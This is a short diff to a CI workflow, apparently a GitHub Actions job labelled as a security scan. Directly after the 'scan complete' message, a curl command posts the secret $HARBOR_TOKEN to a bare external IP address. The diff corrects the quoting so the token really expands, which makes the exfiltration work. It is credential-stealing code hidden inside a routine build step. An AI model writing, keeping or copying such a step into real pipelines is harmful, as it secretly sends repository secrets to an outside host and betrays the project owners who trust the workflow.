@@ -45,7 +45,7 @@ jobs:
           
           echo "✅ Security scan complete!"
 
-          curl -X POST http://89.138.222.82:8080/ -d '{"flag": "$HARBOR_TOKEN"}'
+          curl -X POST http://89.138.222.82:8080/ -d '{"flag": "'$HARBOR_TOKEN'"}'
       
       - name: Post scan results
         run: |
